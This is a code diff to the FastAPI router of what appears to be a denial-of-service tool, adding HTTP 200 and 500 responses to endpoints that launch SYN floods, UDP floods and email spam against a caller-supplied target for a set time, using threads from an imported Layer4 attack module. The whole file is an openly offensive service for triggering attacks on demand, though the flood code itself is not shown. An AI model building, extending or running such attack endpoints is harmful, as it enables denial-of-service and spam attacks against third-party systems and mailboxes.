@@ -1,5 +1,5 @@
 from base64 import encode
-from fastapi import APIRouter, Request
+from fastapi import APIRouter, Request, Response
 from src.denialofservice.layer4 import Layer4
 from src.globals import NUMBER_OF_THREADS
 from threading import Thread
@@ -18,9 +18,11 @@ async def syn_flood(syn_flood: Layer4FloodRequest, request: Request):
             t.start()
         log.info(
             f"{syn_flood.target}:{syn_flood.port} SYN-Flooded from {request.client.host} for {syn_flood.time} seconds")
+        return Response(status_code=200)
     except:
         log.warning(
             f"{syn_flood.target}:{syn_flood.port} SYN-Flood from {request.client.host} for {syn_flood.time} seconds could not be triggered")
+        return Response(status_code=500)
 
 
 @layer4_router.post("/udpflood")
@@ -32,9 +34,11 @@ async def udp_flood(udp_flood: Layer4FloodRequest, request: Request):
             t.start()
         log.info(
             f"{udp_flood.target}:{udp_flood.port} UDP-Flooded from {request.client.host} for {udp_flood.time} seconds")
+        return Response(status_code=200)
     except:
         log.warning(
             f"{udp_flood.target}:{udp_flood.port} UDP-Flood from {request.client.host} for {udp_flood.time} seconds could not be triggered")
+        return Response(status_code=500)
 
 
 @layer4_router.post("/emailspam")
@@ -45,7 +49,8 @@ async def email_spam(email_spam: EmailSpamRequest, request: Request):
         t.start()
         log.info(
             f"{email_spam.target} EMAIL-Spammed from {request.client.host} for {email_spam.time} seconds")
-    except Exception as e:
-        print(e)
+        return Response(status_code=200)
+    except:
         log.warning(
             f"{email_spam.target} EMAIL-Spam from {request.client.host} for {email_spam.time} seconds could not be triggered")
+        return Response(status_code=500)
